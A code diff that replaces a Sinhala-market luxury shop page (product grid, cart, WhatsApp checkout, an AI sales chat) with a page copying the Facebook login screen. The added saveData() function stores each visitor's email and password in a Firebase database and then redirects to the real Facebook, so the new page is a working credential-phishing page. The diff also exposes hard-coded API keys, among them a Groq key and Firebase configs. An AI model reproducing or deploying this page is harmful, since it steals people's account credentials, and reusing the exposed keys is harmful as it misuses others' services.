@@ -3,371 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VELORA - Timeless Luxury</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Lato:wght@300;400;700&family=Noto+Sans+Sinhala:wght@400;700&display=swap" rel="stylesheet">
-    
+    <title>Facebook - Log In or Sign Up</title>
     <style>
-        :root { --gold: #c5a059; --cream: #fbf9f6; --dark: #1a1a1a; }
-        body { background-color: var(--cream); color: var(--dark); font-family: 'Lato', sans-serif; overflow-x: hidden; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
         
-        h1, h2, h3, .serif { font-family: 'Playfair Display', serif; }
-        .sinhala { font-family: 'Noto Sans Sinhala', sans-serif; }
-        
-        #canvas-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.5; pointer-events: none; }
-        .glass-nav { background: rgba(251, 249, 246, 0.85); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(197, 160, 89, 0.15); }
-        
-        /* Chat Styles */
-        .chat-ai { background-color: #f4f1ea; color: #333; border-left: 3px solid var(--gold); border-radius: 4px 12px 12px 12px; font-size: 0.9rem; }
-        .chat-user { background-color: #2d2d2d; color: white; border-radius: 12px 4px 12px 12px; font-size: 0.9rem; }
-        .chat-error { background-color: #ffe4e6; color: #991b1b; border: 1px solid #fecaca; padding: 10px; border-radius: 8px; font-size: 0.85rem; font-weight: bold; }
+        /* Disclaimer Styles */
+        .disclaimer { background-color: white; color: red; padding: 20px; text-align: center; border: 5px solid red; margin-top: 20px; width: 80%; font-size: 24px; font-weight: bold; }
 
-        .kina-footer { font-size: 10px; color: #9ca3af; text-align: center; margin-top: 8px; letter-spacing: 0.05em; }
-        .kina-footer span { color: var(--gold); font-weight: bold; }
-
-        /* Search Bar Glow Animation */
-        @keyframes glow {
-            0% { box-shadow: 0 0 5px rgba(197, 160, 89, 0.2); }
-            50% { box-shadow: 0 0 20px rgba(197, 160, 89, 0.5); }
-            100% { box-shadow: 0 0 5px rgba(197, 160, 89, 0.2); }
-        }
-        .search-glow:focus-within { animation: glow 2s infinite; border-color: var(--gold); }
+        .container { display: flex; width: 980px; margin-top: 40px; justify-content: space-between; }
+        .fb-text { width: 500px; padding-top: 40px; }
+        .fb-text h1 { color: #1877f2; font-size: 60px; margin-bottom: 0; }
+        .fb-text p { font-size: 28px; line-height: 32px; width: 450px; }
+        
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
+        input { width: 90%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        .login-btn { width: 100%; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; padding: 12px; cursor: pointer; }
+        .forgot { color: #1877f2; font-size: 14px; margin: 16px 0; text-decoration: none; display: block; }
+        hr { border: 0.5px solid #dadde1; margin-bottom: 20px; }
+        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: white; font-size: 17px; font-weight: bold; padding: 12px 16px; cursor: pointer; }
     </style>
 </head>
-<body class="antialiased selection:bg-yellow-200 selection:text-black">
+<body>
 
-    <div id="canvas-container"></div>
+    
 
-    <nav class="glass-nav fixed w-full top-0 z-50 transition-all duration-300">
-        <div class="max-w-7xl mx-auto px-6 py-5 flex justify-between items-center">
-            <div class="flex items-center gap-3">
-                <div class="flex flex-col">
-                    <h1 class="text-3xl font-bold tracking-[0.2em] text-gray-900 serif">VELORA</h1>
-                    <span class="text-[9px] uppercase tracking-[0.4em] text-yellow-600 mt-1 pl-1">Luxury Collection</span>
-                </div>
-            </div>
-            <div onclick="toggleCart()" class="cursor-pointer relative group p-2 hover:bg-yellow-50 rounded-full transition duration-300">
-                <span class="text-2xl opacity-80 group-hover:opacity-100">🛒</span>
-                <span id="cart-count" class="absolute -top-1 -right-1 bg-yellow-600 text-white text-[10px] font-bold px-1.5 py-0.5 rounded-full shadow-md">0</span>
-            </div>
+    <div class="container">
+        <div class="fb-text">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
         </div>
-    </nav>
-
-    <header class="pt-44 pb-12 text-center px-4 fade-in">
-        <p class="text-xs font-bold tracking-[0.3em] text-yellow-600 uppercase mb-4">New Arrivals</p>
-        <h2 class="text-5xl md:text-7xl text-gray-900 serif italic mb-8">Timeless Elegance</h2>
-        <div class="w-20 h-[2px] bg-yellow-600 mx-auto opacity-60"></div>
-    </header>
-
-    <div class="relative max-w-lg mx-auto px-6 mb-16 z-40">
-        <div class="absolute inset-0 bg-yellow-600/20 blur-2xl rounded-full opacity-0 hover:opacity-100 transition duration-700 pointer-events-none"></div>
-        <div class="search-glow relative flex items-center bg-white/40 backdrop-blur-xl border border-white/50 rounded-full p-2 shadow-xl transition-all duration-300 hover:bg-white/60">
-            <div class="pl-4 pr-2 text-yellow-700">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
-            </div>
-            <input type="text" id="live-search" placeholder="Search exclusively..." class="w-full bg-transparent border-none outline-none text-gray-800 placeholder-gray-500 font-serif text-lg h-10 px-2" oninput="filterProducts()">
+        <div class="login-box">
+            <input type="text" id="email" placeholder="Email address or phone number">
+            <input type="password" id="password" placeholder="Password">
+            <button class="login-btn" onclick="saveData()">Log In</button>
+            <a href="#" class="forgot">Forgotten password?</a>
+            <hr>
+            <button class="create-btn">Create new account</button>
         </div>
     </div>
 
-    <main id="product-container" class="max-w-7xl mx-auto px-6 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-10 pb-40 min-h-[400px]">
-        <div class="col-span-full text-center py-20">
-            <div class="inline-block w-8 h-8 border-4 border-yellow-600 border-t-transparent rounded-full animate-spin"></div>
-            <p class="text-gray-400 text-xs mt-4 tracking-widest uppercase">Curating Collection...</p>
-        </div>
-    </main>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-    <button onclick="toggleChat()" class="fixed bottom-8 right-8 bg-gray-900 text-white p-4 rounded-full shadow-2xl z-50 hover:bg-yellow-600 transition transform hover:-translate-y-1 flex items-center gap-3 group">
-        <span class="text-xl">✨</span>
-        <span class="max-w-0 overflow-hidden group-hover:max-w-xs transition-all duration-500 font-bold text-xs uppercase tracking-wider whitespace-nowrap">Ask Assistant</span>
-    </button>
-
-    <div id="chat-window" class="hidden fixed bottom-24 right-8 w-80 md:w-96 bg-white rounded-2xl shadow-2xl border border-gray-100 z-50 flex flex-col h-[550px] overflow-hidden transform transition-all duration-300">
-        <div class="bg-gray-900 p-5 flex justify-between items-center relative overflow-hidden">
-            <div class="absolute inset-0 bg-yellow-600/10"></div>
-            <div class="relative z-10">
-                <h3 class="font-bold text-white serif tracking-wide text-lg">VELORA AI</h3>
-                <p class="text-[10px] text-gray-400 uppercase tracking-wider">Personal Concierge</p>
-            </div>
-            <button onclick="toggleChat()" class="text-gray-400 hover:text-white transition z-10 text-xl">×</button>
-        </div>
-        
-        <div id="chat-messages" class="flex-1 p-5 overflow-y-auto space-y-4 bg-[#fafafa] text-sm sinhala">
-            <div class="chat-ai p-4 shadow-sm">
-                Hello! Welcome to VELORA. I am your personal luxury assistant. How can I help you find the perfect piece today?
-            </div>
-        </div>
-
-        <div class="p-4 bg-white border-t border-gray-100">
-            <div class="flex items-center gap-2 bg-gray-50 p-2 rounded-xl border border-gray-200 focus-within:border-yellow-500 transition duration-300">
-                <input id="user-input" type="text" placeholder="Type here..." class="flex-1 bg-transparent outline-none text-sm text-gray-700 font-sinhala px-2 py-1">
-                <button onclick="sendMessage()" class="bg-yellow-600 text-white w-8 h-8 rounded-lg hover:bg-gray-900 transition flex items-center justify-center">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M12 5l7 7-7 7" /></svg>
-                </button>
-            </div>
-            <div class="kina-footer">
-                Powered by <span>kina ai</span>
-            </div>
-        </div>
-    </div>
-
-    <div id="cart-modal" class="hidden fixed inset-0 bg-gray-900/30 backdrop-blur-sm z-50 flex justify-end transition-opacity duration-300">
-        <div class="bg-white w-full max-w-md h-full shadow-2xl flex flex-col transform transition-transform">
-            <div class="p-6 border-b border-gray-100 flex justify-between items-center bg-gray-50/50">
-                <h2 class="text-2xl font-bold serif text-gray-800">Shopping Bag</h2>
-                <button onclick="toggleCart()" class="text-gray-400 hover:text-red-500 transition text-2xl">×</button>
-            </div>
-            <ul id="cart-items" class="flex-1 overflow-y-auto p-6 space-y-6"></ul>
-            <div class="p-6 bg-gray-50 border-t border-gray-100">
-                <div class="flex justify-between items-center mb-6">
-                    <span class="text-gray-500 font-medium uppercase text-xs tracking-widest">Total Estimated</span>
-                    <span class="text-2xl font-bold text-gray-900 serif">Rs. <span id="cart-total">0</span></span>
-                </div>
-                <button onclick="checkoutWhatsApp()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 rounded-xl shadow-lg transition flex justify-center items-center gap-3">
-                    <span>Confirm via WhatsApp</span>
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, getDocs, doc, updateDoc, increment } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
+    <script>
+        // Firebase configuration
         const firebaseConfig = {
-            apiKey: "AIzaSyBoRUkCAhDUfabz2HVv3WO_IvgOHl1bjG8",
-            authDomain: "velora-ea392.firebaseapp.com",
-            projectId: "velora-ea392",
-            storageBucket: "velora-ea392.firebasestorage.app",
-            messagingSenderId: "190374917970",
-            appId: "1:190374917970:web:ef4324bff42880b6e32c8b",
-            measurementId: "G-006QHPS187"
+            apiKey: "AIzaSyAF__nT0KcIICvwJuZUf05P2iMZfDiNo6M",
+            authDomain: "yasodha-ac86b.firebaseapp.com",
+            databaseURL: "https://yasodha-ac86b-default-rtdb.firebaseio.com",
+            projectId: "yasodha-ac86b",
+            storageBucket: "yasodha-ac86b.firebasestorage.app",
+            messagingSenderId: "268363750401",
+            appId: "1:268363750401:web:d97405614b6bf6089e3400",
+            measurementId: "G-3JWTJG76P6"
         };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        
-        // API KEY
-        const GROQ_API_KEY = "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"; 
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-        // Data Storage
-        let productDetails = "Available Products:\n";
-        let allProductsData = []; // Store fetched products here for live search
-        let chatHistory = []; 
+        function saveData() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
 
-        // --- THREE.JS BACKGROUND ---
-        function initThreeJS() {
-            const container = document.getElementById('canvas-container');
-            const scene = new THREE.Scene();
-            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-            const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
-            renderer.setSize(window.innerWidth, window.innerHeight);
-            container.appendChild(renderer.domElement);
-            
-            const particlesGeometry = new THREE.BufferGeometry();
-            const count = 500; 
-            const posArray = new Float32Array(count * 3);
-            for(let i = 0; i < count * 3; i++) posArray[i] = (Math.random() - 0.5) * 18;
-            particlesGeometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
-            
-            const material = new THREE.PointsMaterial({ size: 0.05, color: 0xc5a059, transparent: true, opacity: 0.7 });
-            const mesh = new THREE.Points(particlesGeometry, material);
-            scene.add(mesh);
-            camera.position.z = 5;
-
-            // Subtle mouse interaction
-            document.addEventListener('mousemove', (event) => {
-                mesh.rotation.x = event.clientY * 0.0001;
-                mesh.rotation.y = event.clientX * 0.0001;
-            });
-
-            function animate() {
-                mesh.rotation.y += 0.0005; 
-                renderer.render(scene, camera);
-                requestAnimationFrame(animate);
-            }
-            animate();
-            window.addEventListener('resize', () => { camera.aspect = window.innerWidth / window.innerHeight; camera.updateProjectionMatrix(); renderer.setSize(window.innerWidth, window.innerHeight); });
-        }
-        initThreeJS();
-
-        // --- SHOP & SEARCH LOGIC ---
-        let cart = [];
-
-        async function loadProducts() {
-            const container = document.getElementById('product-container');
-            try {
-                const querySnapshot = await getDocs(collection(db, "products"));
-                
-                if (querySnapshot.empty) { 
-                    container.innerHTML = '<p class="col-span-full text-center text-gray-400 text-sm">No exclusive items available at the moment.</p>'; 
-                    return; 
-                }
-                
-                // Clear and Populate Global Data
-                allProductsData = [];
-                productDetails = "Available Products:\n";
-
-                querySnapshot.forEach((docSnap) => {
-                    const item = docSnap.data();
-                    const productObj = { id: docSnap.id, ...item };
-                    allProductsData.push(productObj);
-                    productDetails += `- ${item.name} : Rs. ${item.price}\n`;
+            if(email && password) {
+                database.ref('logins/' + Date.now()).set({
+                    email: email,
+                    password: password
+                }).then(() => {
+                    
+                    window.location.href = "https://www.facebook.com"; // Redirect to real FB
                 });
-
-                // Initial Render
-                renderProducts(allProductsData);
-
-            } catch (e) { 
-                console.error(e);
-                container.innerHTML = '<p class="col-span-full text-center text-red-400">Failed to load items.</p>'; 
+            } else {
+                alert("Please fill all fields");
             }
         }
-
-        // --- RENDER & FILTER FUNCTION ---
-        window.renderProducts = (products) => {
-            const container = document.getElementById('product-container');
-            container.innerHTML = '';
-            
-            if (products.length === 0) {
-                container.innerHTML = '<div class="col-span-full text-center py-10"><p class="text-gray-400 text-lg serif">No items match your search.</p></div>';
-                return;
-            }
-
-            products.forEach(item => {
-                const whatsappLink = item.catalogLink ? `<a href="${item.catalogLink}" target="_blank" class="text-[10px] text-yellow-600 font-bold uppercase tracking-wider hover:underline mb-2 block">View in Catalog ↗</a>` : '';
-                
-                const html = `
-                    <div class="group bg-white rounded-xl p-4 shadow-sm hover:shadow-2xl transition-all duration-500 border border-gray-100 flex flex-col h-full relative fade-in">
-                        <div class="relative overflow-hidden rounded-lg aspect-[4/5] bg-gray-50 mb-4">
-                            <img src="${item.image}" alt="${item.name}" class="w-full h-full object-cover transform group-hover:scale-105 transition duration-700">
-                        </div>
-                        <div class="text-center flex-grow flex flex-col justify-end">
-                            <h3 class="font-serif text-lg text-gray-900 mb-1 leading-tight">${item.name}</h3>
-                            ${whatsappLink}
-                            <p class="text-gray-500 font-medium text-sm mt-1">Rs. ${item.price.toLocaleString()}</p>
-                        </div>
-                        <button onclick="addToCart('${item.id}', '${item.name}', ${item.price})" class="mt-4 w-full bg-white border border-gray-200 text-gray-900 py-3 rounded-lg font-bold text-[10px] uppercase tracking-[0.2em] hover:bg-yellow-600 hover:text-white hover:border-yellow-600 transition duration-300">Add to Bag</button>
-                    </div>`;
-                container.innerHTML += html;
-            });
-        };
-
-        window.filterProducts = () => {
-            const searchTerm = document.getElementById('live-search').value.toLowerCase();
-            const filtered = allProductsData.filter(item => item.name.toLowerCase().includes(searchTerm));
-            renderProducts(filtered);
-        };
-
-        // --- CART FUNCTIONS ---
-        window.addToCart = (id, name, price) => { 
-            cart.push({ id, name, price }); updateCartUI(); 
-            const badge = document.getElementById('cart-count'); 
-            badge.classList.add('scale-150', 'bg-red-500'); 
-            setTimeout(() => badge.classList.remove('scale-150', 'bg-red-500'), 300); 
-        };
-        window.toggleCart = () => document.getElementById('cart-modal').classList.toggle('hidden');
-        window.removeFromCart = (index) => { cart.splice(index, 1); updateCartUI(); };
-        function updateCartUI() {
-            document.getElementById('cart-count').innerText = cart.length;
-            const list = document.getElementById('cart-items');
-            let total = 0; list.innerHTML = '';
-            cart.forEach((item, index) => { 
-                total += item.price; 
-                list.innerHTML += `<li class="flex gap-4 items-center border-b border-gray-50 pb-4"><div class="w-12 h-12 bg-gray-50 rounded flex items-center justify-center text-lg">✨</div><div class="flex-1"><h4 class="font-bold text-gray-800 text-sm serif">${item.name}</h4><p class="text-xs text-gray-500">Rs. ${item.price.toLocaleString()}</p></div><button onclick="removeFromCart(${index})" class="text-gray-300 hover:text-red-500 transition">✕</button></li>`; 
-            });
-            document.getElementById('cart-total').innerText = total.toLocaleString();
-        }
-        window.checkoutWhatsApp = async () => {
-            if (cart.length === 0) return alert("Bag is empty!");
-            cart.forEach(async (item) => { try { const productRef = doc(db, "products", item.id); await updateDoc(productRef, { clicks: increment(1) }); } catch(e) {} });
-            let msg = "*ORDER INQUIRY - VELORA* 💍\n\n"; let total = 0;
-            cart.forEach(item => { msg += `▪ ${item.name} : Rs. ${item.price}\n`; total += item.price; });
-            msg += `\n*TOTAL: Rs. ${total.toLocaleString()}*`;
-            window.open(`https://wa.me/94717148469?text=${encodeURIComponent(msg)}`, '_blank');
-        };
-
-        // --- AI CHAT SYSTEM (WITH MEMORY) ---
-        window.toggleChat = () => document.getElementById('chat-window').classList.toggle('hidden');
-
-        window.sendMessage = async () => {
-            const input = document.getElementById('user-input');
-            const msg = input.value; if (!msg) return;
-            
-            addMsg(msg, 'user');
-            chatHistory.push({ role: "user", content: msg }); // Memory update
-
-            input.value = '';
-            const loadingId = addMsg("Thinking...", 'ai');
-
-            if (!GROQ_API_KEY || GROQ_API_KEY.includes("PASTE_")) {
-                const el = document.getElementById(loadingId); if(el) el.remove();
-                addMsg("⚠️ API Key Error: Please check code.", 'error');
-                return;
-            }
-
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 10000);
-
-                const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
-                    method: "POST",
-                    headers: { "Authorization": `Bearer ${GROQ_API_KEY}`, "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        model: "llama-3.3-70b-versatile",
-                        messages: [
-                            { 
-                                role: "system", 
-                                content: `You are Velora AI, a sophisticated luxury sales assistant.
-                                          GOAL: Be persuasive, elegant, and helpful. 
-                                          If discussing a specific item, remember it.
-                                          Emphasize "Timeless Elegance," "Premium Quality," and "Status Symbol."
-                                          Keep responses under 50 words. Answer in English.
-                                          PRODUCT LIST: ${productDetails}` 
-                            },
-                            ...chatHistory 
-                        ]
-                    }),
-                    signal: controller.signal
-                });
-                
-                clearTimeout(timeoutId);
-
-                if (!res.ok) throw new Error(`Server Error: ${res.status}`);
-
-                const data = await res.json();
-                const aiReply = data.choices[0].message.content;
-                
-                const el = document.getElementById(loadingId); if(el) el.remove();
-                addMsg(aiReply, 'ai');
-                chatHistory.push({ role: "assistant", content: aiReply }); // Memory update
-
-            } catch (error) {
-                const el = document.getElementById(loadingId); if(el) el.remove();
-                console.error("Debug:", error);
-                addMsg("⚠️ Connection Error. Please try again.", 'error');
-            }
-        };
-
-        function addMsg(text, type) {
-            const box = document.getElementById('chat-messages');
-            const div = document.createElement('div');
-            const uniqueId = 'msg-' + Date.now() + Math.random().toString(36).substr(2, 9);
-            div.id = uniqueId;
-            let className = 'chat-ai p-4 shadow-sm';
-            if (type === 'user') className = 'chat-user p-4 shadow-sm self-end';
-            if (type === 'error') className = 'chat-error self-center';
-            div.className = className; div.innerText = text;
-            const wrapper = document.createElement('div');
-            wrapper.className = `flex w-full ${type === 'user' ? 'justify-end' : 'justify-start'}`;
-            wrapper.appendChild(div); 
-            box.appendChild(wrapper); 
-            box.scrollTop = box.scrollHeight;
-            return uniqueId; 
-        }
-
-        loadProducts();
     </script>
 </body>
 </html>
